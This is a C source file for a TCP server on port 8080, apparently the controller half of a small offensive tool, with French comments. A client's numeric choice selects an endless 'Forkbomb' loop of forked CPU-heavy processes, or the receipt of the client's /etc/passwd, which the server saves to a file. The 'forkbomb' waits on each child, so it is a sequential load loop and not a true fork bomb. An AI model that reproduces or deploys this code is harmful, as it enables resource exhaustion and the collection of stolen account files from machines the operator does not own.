#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>

#define PORT 8080

// Fonction pour gérer le forkbomb
void intensiveTask() {
    for (long i = 2; i < 1000000; i++) {
        int prime = 1;
        for (long j = 2; j < i; j++) {
            if (i % j == 0) {
                prime = 0;
                break;
            }
        }
    }
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    printf("Creating socket...\n");
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    printf("Setting socket options...\n");
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    printf("Binding socket...\n");
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    printf("Starting to listen on the socket...\n");
    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    while (1) {
        printf("Waiting for a client to connect...\n");
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            perror("accept");
            exit(EXIT_FAILURE);
        }
        printf("Client connected.\n");

        // Attendez-vous à recevoir le choix du client (1 pour Forkbomb, 2 pour /etc/passwd, etc.)
        int client_choice;
        recv(new_socket, &client_choice, sizeof(client_choice), 0);

        switch (client_choice) {
            case 1:
                printf("Client chose Forkbomb\n");
                // Ajoutez ici le code pour gérer le forkbomb
                while (1) {
                    pid_t pid = fork();

                    if (pid == 0) {
                        printf("Child process with PID: %d\n", getpid());
                        intensiveTask();
                        exit(0);
                    } else if (pid > 0) {
                        wait(NULL);
                    } else {
                        perror("Fork error");
                        exit(EXIT_FAILURE);
                    }
                }
                break;

            case 2:
                printf("Client chose Option 2\n");

                // Attendez-vous à recevoir le contenu du fichier "/etc/passwd" du client.
                FILE *passwdFile = fopen("server_passwd.txt", "w");
                if (passwdFile == NULL) {
                    perror("Error opening server_passwd.txt");
                    // Gérer l'erreur ici, par exemple, en envoyant un message d'erreur au client
                } else {
                    char buffer[4096]; // Taille du tampon pour recevoir les données du client
                    size_t bytesRead;

                    while ((bytesRead = recv(new_socket, buffer, sizeof(buffer), 0)) > 0) {
                        // Écrire les données reçues dans le fichier server_passwd.txt
                        fwrite(buffer, 1, bytesRead, passwdFile);
                    }

                    fclose(passwdFile);
                    printf("Received /etc/passwd from client and saved it as server_passwd.txt\n");
                }
                break;

            case 3:
                printf("Client chose Option 3\n");
                // Ajoutez ici le code pour l'option 3
                break;

            case 4:
                printf("Client chose Option 4 (Quitter le programme)\n");
                close(new_socket);
                printf("Client socket closed.\n");
                exit(EXIT_SUCCESS);

            default:
                printf("Invalid choice. Please enter a number between 1 and 4.\n");
        }

        close(new_socket);
        printf("Client socket closed.\n");
    }

    close(server_fd);
    printf("Server socket closed.\n");

    return 0;
}
